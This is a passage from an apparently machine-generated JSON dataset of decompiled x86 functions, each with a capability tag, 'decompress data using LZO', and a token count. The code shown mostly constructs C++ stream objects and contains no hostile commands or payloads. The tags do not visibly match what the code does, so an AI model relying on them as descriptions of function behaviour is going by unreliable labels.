        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0047b460(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[2];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    in_ECX[1] = 0;\n    fcn.0049c4a0(0);\n    iVar1 = arg_8h[4];\n    in_ECX[2] = iVar1;\n    *(in_ECX + *(iVar1 + -0xc) + 8) = arg_8h[5];\n    fcn.0049c4a0(0);\n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[6];\n    in_ECX[2] = arg_8h[7];\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[8];\n    in_ECX[2] = arg_8h[9];\n    fcn.00478480();\n    fcn.0049c4a0(in_ECX + 3);\n    return;\n}\n",
        "token_count": 326
    },
    "0047b920": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0047b920(int32_t *arg_8h)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    uint *in_ECX;\n    int32_t iVar3;\n    uint var_1ch;\n    uint var_ch;\n    \n    fcn.0049b670();\n    *in_ECX = 0x506844;\n    *(in_ECX + 0x3c) = 0;\n    iVar3 = arg_8h[1];\n    in_ECX[0x3b] = 0;\n    in_ECX[1] = iVar3;\n    iVar3 = *arg_8h;\n    *(in_ECX + 0xf2) = 0;\n    iVar3 = *(iVar3 + -0xc);\n    in_ECX[0x3d] = 0;\n    in_ECX[0x3e] = 0;\n    iVar3 = iVar3 + arg_8h;\n    in_ECX[0x1f] = 0x506858;\n    in_ECX[0x3f] = 0;\n    in_ECX[0x40] = 0;\n    fcn.0049ac60(iVar3);\n    fcn.0049cbb0(in_ECX + 0x3a);\n    uVar2 = *(iVar3 + 0x70);\n    *(iVar3 + 0x70) = 0;\n    in_ECX[0x3b] = uVar2;\n    *(in_ECX + 0x3c) = *(iVar3 + 0x74);\n    uVar1 = *(iVar3 + 0x76);\n    in_ECX[0x3d] = 0;\n    *(in_ECX + 0xf2) = uVar1;\n    arg_8h[1] = 0;\n    *in_ECX = 0x50aa48;\n    in_ECX[0x1f] = 0x50aa70;\n    in_ECX[2] = 0x50aa5c;\n    fcn.0047a310(arg_8h + 3);\n    in_ECX[0x3d] = in_ECX + 3;\n    return;\n}\n",
        "token_count": 505
    },
    "0047ba60": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0047ba60(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    fcn.0049b670();\n    *(in_ECX + 0xf2) = 0;\n    in_ECX[0x3b] = 0;\n    *(in_ECX + 0x3c) = 0;\n    in_ECX[0x3d] = 0;\n    in_ECX[0x3e] = 0;\n    in_ECX[0x3f] = 0;\n    in_ECX[0x40] = 0;\n    *in_ECX = 0x506844;\n    in_ECX[0x1f] = 0x506858;\n    in_ECX[1] = 0;\n    fcn.0049cca0(0);\n    in_ECX[2] = 0x5068a8;\n    in_ECX[0x1f] = 0x5068bc;\n    fcn.0049cca0(0);\n    *in_ECX = 0x50aa48;\n    in_ECX[0x1f] = 0x50aa70;\n    in_ECX[2] = 0x50aa5c;\n    fcn.0047a450();\n    fcn.0049cca0(in_ECX + 3);\n    iVar1 = fcn.00478e20(arg_8h, arg_ch);\n    if (iVar1 != 0) {\n        fcn.0049ce20(0);\n        return;\n    }\n    fcn.0049ce20(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 415
    },
    "0047bbd0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0047bbd0(uint *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    fcn.0049b670();\n    *(in_ECX + 0xf2) = 0;\n    in_ECX[0x3b] = 0;\n    *(in_ECX + 0x3c) = 0;\n    in_ECX[0x3d] = 0;\n    in_ECX[0x3e] = 0;\n    in_ECX[0x3f] = 0;\n    in_ECX[0x40] = 0;\n    *in_ECX = 0x506844;\n    in_ECX[0x1f] = 0x506858;\n    in_ECX[1] = 0;\n    fcn.0049cca0(0);\n    in_ECX[2] = 0x5068a8;\n    in_ECX[0x1f] = 0x5068bc;\n    fcn.0049cca0(0);\n    *in_ECX = 0x50aa48;\n    in_ECX[0x1f] = 0x50aa70;\n    in_ECX[2] = 0x50aa5c;\n    fcn.0047a450();\n    fcn.0049cca0(in_ECX + 3);\n    iVar1 = fcn.00478e20(*arg_8h, arg_ch);\n    if (iVar1 != 0) {\n        fcn.0049ce20(0);\n        return;\n    }\n    fcn.0049ce20(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 418
    },
    "0047bd40": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __fastcall fcn.0047bd40(uint *param_1)\n\n{\n    uint var_ch;\n    \n    fcn.0049b670();\n    *(param_1 + 0xf2) = 0;\n    param_1[0x3b] = 0;\n    *(param_1 + 0x3c) = 0;\n    param_1[0x3d] = 0;\n    param_1[0x3e] = 0;\n    param_1[0x3f] = 0;\n    param_1[0x40] = 0;\n    *param_1 = 0x506844;\n    param_1[0x1f] = 0x506858;\n    param_1[1] = 0;\n    fcn.0049cca0(0);\n    param_1[2] = 0x5068a8;\n    param_1[0x1f] = 0x5068bc;\n    fcn.0049cca0(0);\n    *param_1 = 0x50aa48;\n    param_1[0x1f] = 0x50aa70;\n    param_1[2] = 0x50aa5c;\n    fcn.0047a450();\n    fcn.0049cca0(param_1 + 3);\n    return;\n}\n",
        "token_count": 318
    },
    "0047be50": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0047be50(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uchar uVar1;\n    ushort uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *in_ECX;\n    int32_t iVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_ch;\n    \n    iVar3 = arg_8h[2];\n    *in_ECX = iVar3;\n    *(in_ECX + *(iVar3 + -0xc)) = arg_8h[3];\n    in_ECX[1] = arg_ch[1];\n    iVar3 = *(iVar3 + -0xc);\n    iVar5 = *(*arg_ch + -0xc) + arg_ch;\n    fcn.0049ac60(iVar5);\n    fcn.0049cbb0(in_ECX + iVar3 + 0x6c);\n    uVar4 = *(iVar5 + 0x70);\n    *(iVar5 + 0x70) = 0;\n    *(in_ECX + iVar3 + 0x70) = uVar4;\n    uVar2 = *(iVar5 + 0x74);\n    uVar1 = *(iVar5 + 0x76);\n    *(in_ECX + iVar3 + 0x78) = 0;\n    *(in_ECX + iVar3 + 0x74) = uVar2;\n    *(in_ECX + iVar3 + 0x76) = uVar1;\n    iVar3 = arg_8h[4];\n    arg_ch[1] = 0;\n    in_ECX[2] = iVar3;\n    *(in_ECX + *(iVar3 + -0xc) + 8) = arg_8h[5];\n    iVar3 = arg_8h[1];\n    *in_ECX = iVar3;\n    *(in_ECX + *(iVar3 + -0xc)) = arg_8h[6];\n    in_ECX[2] = arg_8h[7];\n    iVar3 = *arg_8h;\n    *in_ECX = iVar3;\n    *(in_ECX + *(iVar3 + -0xc)) = arg_8h[8];\n    in_ECX[2] = arg_8h[9];\n    fcn.0047a310(arg_ch + 3);\n    *(in_ECX + *(*in_ECX + -0xc) + 0x78) = in_ECX + 3;\n    return;\n}\n",
        "token_count": 569
    },
    "0047bf80": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0047bf80(int32_t *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[2];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    in_ECX[1] = 0;\n    fcn.0049cca0(0);\n    iVar1 = arg_8h[4];\n    in_ECX[2] = iVar1;\n    *(in_ECX + *(iVar1 + -0xc) + 8) = arg_8h[5];\n    fcn.0049cca0(0);\n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[6];\n    in_ECX[2] = arg_8h[7];\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[8];\n    in_ECX[2] = arg_8h[9];\n    fcn.0047a450();\n    fcn.0049cca0(in_ECX + 3);\n    iVar1 = fcn.00478e20(arg_ch, arg_10h);\n    if (iVar1 != 0) {\n        fcn.0049ce20(0);\n        return;\n    }\n    fcn.0049ce20(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 408
    },
    "0047c0e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0047c0e0(int32_t *arg_8h, uint *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[2];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    in_ECX[1] = 0;\n    fcn.0049cca0(0);\n    iVar1 = arg_8h[4];\n    in_ECX[2] = iVar1;\n    *(in_ECX + *(iVar1 + -0xc) + 8) = arg_8h[5];\n    fcn.0049cca0(0);\n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[6];\n    in_ECX[2] = arg_8h[7];\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[8];\n    in_ECX[2] = arg_8h[9];\n    fcn.0047a450();\n    fcn.0049cca0(in_ECX + 3);\n    iVar1 = fcn.00478e20(*arg_ch, arg_10h);\n    if (iVar1 != 0) {\n        fcn.0049ce20(0);\n        return;\n    }\n    fcn.0049ce20(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 412
    },
    "0047c240": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0047c240(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[2];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    in_ECX[1] = 0;\n    fcn.0049cca0(0);\n    iVar1 = arg_8h[4];\n    in_ECX[2] = iVar1;\n    *(in_ECX + *(iVar1 + -0xc) + 8) = arg_8h[5];\n    fcn.0049cca0(0);\n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[6];\n    in_ECX[2] = arg_8h[7];\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[8];\n    in_ECX[2] = arg_8h[9];\n    fcn.0047a450();\n    fcn.0049cca0(in_ECX + 3);\n    return;\n}\n",
        "token_count": 321
    },
    "0047c550": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch_12\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_ch_2\n// WARNING: Removing unreachable block (ram,0x0047d000)\n// WARNING: Removing unreachable block (ram,0x0047cee0)\n// WARNING: Removing unreachable block (ram,0x0047cdc0)\n// WARNING: Removing unreachable block (ram,0x0047cca0)\n// WARNING: Removing unreachable block (ram,0x0047cb80)\n// WARNING: Removing unreachable block (ram,0x0047ca60)\n// WARNING: Removing unreachable block (ram,0x0047c940)\n// WARNING: Removing unreachable block (ram,0x0047c820)\n// WARNING: Removing unreachable block (ram,0x0047c700)\n// WARNING: Removing unreachable block (ram,0x0047c5e0)\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __fastcall fcn.0047c550(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    ushort uVar2;\n    int16_t iVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    int16_t *piVar6;\n    uint32_t uVar7;\n    int32_t *extraout_ECX;\n    int32_t *extraout_ECX_00;\n    int32_t *extraout_ECX_01;\n    int32_t *extraout_ECX_02;\n    int32_t *extraout_ECX_03;\n    int32_t *extraout_ECX_04;\n    int32_t *extraout_ECX_05;\n    int32_t *extraout_ECX_06;\n    int32_t *extraout_ECX_07;\n    int32_t *extraout_ECX_08;\n    int32_t *extraout_ECX_09;\n    int32_t *extraout_ECX_10;\n    int32_t iVar8;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t extraout_EDX_01;\n    int32_t extraout_EDX_02;\n    int32_t extraout_EDX_03;\n    int32_t extraout_EDX_04;\n    int32_t extraout_EDX_05;\n    int32_t extraout_EDX_06;\n    int32_t extraout_EDX_07;\n    int32_t extraout_EDX_08;\n    int32_t iVar9;\n    ulong uVar10;\n    uint var_8h_11;\n    uint var_1dh;\n    uint var_ch;\n    char cStack989;\n    uint var_1ch_12;\n    int32_t in_stack_fffffc48;\n    int16_t *in_stack_fffffc4c;\n    uint var_ch_12;\n    uint var_8h;\n    char cStack873;\n    uint32_t uStack872;\n    uint uStack856;\n    int32_t iStack852;\n    uint var_1dh_11;\n    uint var_ch_11;\n    uint var_8h_2;\n    uint var_1dh_10;\n    uint var_ch_10;\n    uint var_8h_3;\n    uint var_1dh_9;\n    uint var_ch_9;\n    uint var_8h_4;\n    uint var_1dh_8;\n    uint var_ch_8;\n    uint var_8h_5;\n    uint var_1dh_7;\n    uint var_ch_7;\n    uint var_8h_6;\n    uint var_1dh_6;\n    uint var_ch_6;\n    uint var_8h_7;\n    uint var_1dh_5;\n    uint var_ch_5;\n    uint var_8h_8;\n    uint var_1dh_4;\n    uint var_ch_4;\n    uint var_8h_9;\n    uint var_1dh_3;\n    uint var_ch_3;\n    uint var_8h_10;\n    uint var_1dh_2;\n    uint var_ch_2;\n    \n    fcn.0047e5b0();\n    if (var_1dh_2 == '\\0') {\n        return param_1;\n    }\n    piVar5 = *(param_1 + *(*param_1 + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 0x30))();\n        return param_1;\n    }\n    fcn.0049e780();\n    if (extraout_EDX == 1) {\n        fcn.004a36d0();\n        iVar9 = *(*param_1 + -0xc);\n        puVar1 = param_1 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(param_1 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3b60();\n    }\n    else {\n        fcn.004a36d0();\n        iVar9 = *(*param_1 + -0xc);\n        puVar1 = param_1 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(param_1 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3840();\n            return param_1;\n        }\n        fcn.004a3b60();\n    }\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.0047e5b0();\n    if (var_1dh_3 == '\\0') {\n        return extraout_ECX;\n    }\n    piVar5 = *(extraout_ECX + *(*extraout_ECX + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 8))();\n        return extraout_ECX;\n    }\n    fcn.0049e780();\n    if (extraout_EDX_00 == 1) {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX + -0xc);\n        puVar1 = extraout_ECX + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3b60();\n    }\n    else {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX + -0xc);\n        puVar1 = extraout_ECX + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3840();\n            return extraout_ECX;\n        }\n        fcn.004a3b60();\n    }\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.0047e5b0();\n    if (var_1dh_4 == '\\0') {\n        return extraout_ECX_00;\n    }\n    piVar5 = *(extraout_ECX_00 + *(*extraout_ECX_00 + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 0x28))();\n        return extraout_ECX_00;\n    }\n    fcn.0049e780();\n    if (extraout_EDX_01 == 1) {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_00 + -0xc);\n        puVar1 = extraout_ECX_00 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_00 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3b60();\n    }\n    else {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_00 + -0xc);\n        puVar1 = extraout_ECX_00 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_00 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3840();\n            return extraout_ECX_00;\n        }\n        fcn.004a3b60();\n    }\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.0047e5b0();\n    if (var_1dh_5 == '\\0') {\n        return extraout_ECX_01;\n    }\n    piVar5 = *(extraout_ECX_01 + *(*extraout_ECX_01 + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 0x2c))();\n        return extraout_ECX_01;\n    }\n    fcn.0049e780();\n    if (extraout_EDX_02 == 1) {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_01 + -0xc);\n        puVar1 = extraout_ECX_01 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_01 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3b60();\n    }\n    else {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_01 + -0xc);\n        puVar1 = extraout_ECX_01 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_01 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3840();\n            return extraout_ECX_01;\n        }\n        fcn.004a3b60();\n    }\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.0047e5b0();\n    if (var_1dh_6 == '\\0') {\n        return extraout_ECX_02;\n    }\n    piVar5 = *(extraout_ECX_02 + *(*extraout_ECX_02 + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 0x24))();\n        return extraout_ECX_02;\n    }\n    fcn.0049e780();\n    if (extraout_EDX_03 == 1) {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_02 + -0xc);\n        puVar1 = extraout_ECX_02 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_02 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3b60();\n    }\n    else {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_02 + -0xc);\n        puVar1 = extraout_ECX_02 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_02 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3840();\n            return extraout_ECX_02;\n        }\n        fcn.004a3b60();\n    }\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.0047e5b0();\n    if (var_1dh_7 == '\\0') {\n        return extraout_ECX_03;\n    }\n    piVar5 = *(extraout_ECX_03 + *(*extraout_ECX_03 + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 0x14))();\n        return extraout_ECX_03;\n    }\n    fcn.0049e780();\n    if (extraout_EDX_04 == 1) {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_03 + -0xc);\n        puVar1 = extraout_ECX_03 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_03 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3b60();\n    }\n    else {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_03 + -0xc);\n        puVar1 = extraout_ECX_03 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_03 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3840();\n            return extraout_ECX_03;\n        }\n        fcn.004a3b60();\n    }\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.0047e5b0();\n    if (var_1dh_8 == '\\0') {\n        return extraout_ECX_04;\n    }\n    piVar5 = *(extraout_ECX_04 + *(*extraout_ECX_04 + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 0xc))();\n        return extraout_ECX_04;\n    }\n    fcn.0049e780();\n    if (extraout_EDX_05 == 1) {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_04 + -0xc);\n        puVar1 = extraout_ECX_04 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_04 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3b60();\n    }\n    else {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_04 + -0xc);\n        puVar1 = extraout_ECX_04 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_04 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3840();\n            return extraout_ECX_04;\n        }\n        fcn.004a3b60();\n    }\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.0047e5b0();\n    if (var_1dh_9 == '\\0') {\n        return extraout_ECX_05;\n    }\n    piVar5 = *(extraout_ECX_05 + *(*extraout_ECX_05 + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 0x18))();\n        return extraout_ECX_05;\n    }\n    fcn.0049e780();\n    if (extraout_EDX_06 == 1) {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_05 + -0xc);\n        puVar1 = extraout_ECX_05 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_05 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3b60();\n    }\n    else {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_05 + -0xc);\n        puVar1 = extraout_ECX_05 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_05 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3840();\n            return extraout_ECX_05;\n        }\n        fcn.004a3b60();\n    }\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.0047e5b0();\n    if (var_1dh_10 == '\\0') {\n        return extraout_ECX_06;\n    }\n    piVar5 = *(extraout_ECX_06 + *(*extraout_ECX_06 + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 0x10))();\n        return extraout_ECX_06;\n    }\n    fcn.0049e780();\n    if (extraout_EDX_07 == 1) {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_06 + -0xc);\n        puVar1 = extraout_ECX_06 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_06 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3b60();\n    }\n    else {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_06 + -0xc);\n        puVar1 = extraout_ECX_06 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_06 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3840();\n            return extraout_ECX_06;\n        }\n        fcn.004a3b60();\n    }\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.0047e5b0();\n    if (var_1dh_11 == '\\0') {\n        return extraout_ECX_07;\n    }\n    iStack852 = *(*extraout_ECX_07 + -0xc) + extraout_ECX_07;\n    if (*(iStack852 + 0x84) != NULL) {\n        (**(**(iStack852 + 0x84) + 0x1c))();\n        return extraout_ECX_07;\n    }\n    fcn.0049e780();\n    if (extraout_EDX_08 == 1) {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_07 + -0xc);\n        puVar1 = extraout_ECX_07 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_07 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3b60();\n    }\n    else {\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_07 + -0xc);\n        puVar1 = extraout_ECX_07 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_07 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3840();\n            return extraout_ECX_07;\n        }\n        fcn.004a3b60();\n    }\n    fcn.004a3840();\n    uStack856 = fcn.0041b360();\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.0047e5b0(extraout_ECX_08, 0);\n    if (cStack873 == '\\0') {\n        return extraout_ECX_08;\n    }\n    uStack872 = 0;\n    iVar9 = *(*extraout_ECX_08 + -0xc) + extraout_ECX_08;\n    if (*(iVar9 + 0x84) != NULL) {\n        (**(**(iVar9 + 0x84) + 0x20))(*(iVar9 + 0x78), 0xffff, 0, 0xffff, iVar9, &stack0xfffffc98, 0x47cf8e);\ncode_r0x0047d109:\n        if (uStack872 == 0) {\n            return extraout_ECX_08;\n        }\n        fcn.0049ce20(uStack872 | *(extraout_ECX_08 + *(*extraout_ECX_08 + -0xc) + 0x14));\n        return extraout_ECX_08;\n    }\n    uVar10 = fcn.0049e780();\n    if (uVar10 >> 0x20 == 1) {\n        fcn.004a36d0(uVar10);\n        iVar9 = *(*extraout_ECX_08 + -0xc);\n        puVar1 = extraout_ECX_08 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_08 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3b60();\n        }\n        piVar5 = fcn.004a3b60();\n    }\n    else {\n        fcn.004a36d0(uVar10);\n        iVar9 = *(*extraout_ECX_08 + -0xc);\n        puVar1 = extraout_ECX_08 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_08 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3840();\n            goto code_r0x0047d109;\n        }\n        fcn.004a3b60();\n        piVar5 = extraout_ECX_08;\n    }\n    fcn.004a3840();\n    uVar4 = fcn.0041b360(piVar5);\n    fcn.004a3840();\n    fcn.0041b360(uVar4);\n    piVar5 = *(extraout_ECX_09 + *(*extraout_ECX_09 + -0xc) + 0x7c);\n    if (piVar5 != NULL) {\n        uVar2 = (**(*piVar5 + 0x28))(10);\n        piVar5 = fcn.0047d200(uVar4, 0x47d0ae, uVar2);\n        return piVar5;\n    }\n    fcn.0049e780();\n    extraout_ECX_10[1] = 0;\n    fcn.0047e5b0(extraout_ECX_10, 1);\n    if (cStack989 == '\\0') {\n        iVar8 = extraout_ECX_10[1];\n    }\n    else {\n        piVar5 = *(extraout_ECX_10 + *(*extraout_ECX_10 + -0xc) + 0x78);\n        piVar6 = piVar5[2];\n        if (piVar6 <= piVar5[3] && piVar5[3] != piVar6) goto code_r0x0047d2c7;\ncode_r0x0047d271:\n        iVar3 = (**(*piVar5 + 0x24))();\n        iVar8 = extraout_ECX_10[1];\n        iVar9 = iVar8 + 1;\n        piVar6 = in_stack_fffffc4c;\n        if (iVar9 < in_stack_fffffc48) {\n            do {\n                if (iVar3 == -1) {\n                    uVar7 = 2;\ncode_r0x0047d3b2:\n                    if (0 < in_stack_fffffc48) {\n                        *piVar6 = 0;\n                    }\n                    if (iVar8 == 0) {\ncode_r0x0047d32d:\n                        uVar7 = uVar7 | 4;\n                    }\n                    else if (uVar7 == 0) {\n                        return extraout_ECX_10;\n                    }\n                    goto code_r0x0047d385;\n                }\n                if (iVar3 == var_ch_12) {\n                    uVar7 = 0;\n                    goto code_r0x0047d3b2;\n                }\n                in_stack_fffffc4c = piVar6 + 1;\n                *piVar6 = iVar3;\n                extraout_ECX_10[1] = iVar9;\n                piVar6 = piVar5[2];\n                if (piVar6 < 